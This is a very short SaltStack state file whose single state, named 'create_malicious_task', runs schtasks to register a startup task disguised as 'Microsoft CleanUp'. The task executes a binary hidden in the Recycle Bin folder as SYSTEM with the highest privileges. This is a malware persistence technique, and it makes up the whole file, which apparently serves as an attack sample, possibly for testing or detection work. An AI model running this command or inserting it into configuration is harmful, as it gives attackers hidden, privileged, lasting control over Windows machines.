create_malicious_task:
  cmd.run:
    - name: 'schtasks /create /tn "Microsoft CleanUp" /tr "C:\$Recycle.bin\Recycle Bin.exe" /sc onstart /ru SYSTEM /rl HIGHEST /f'
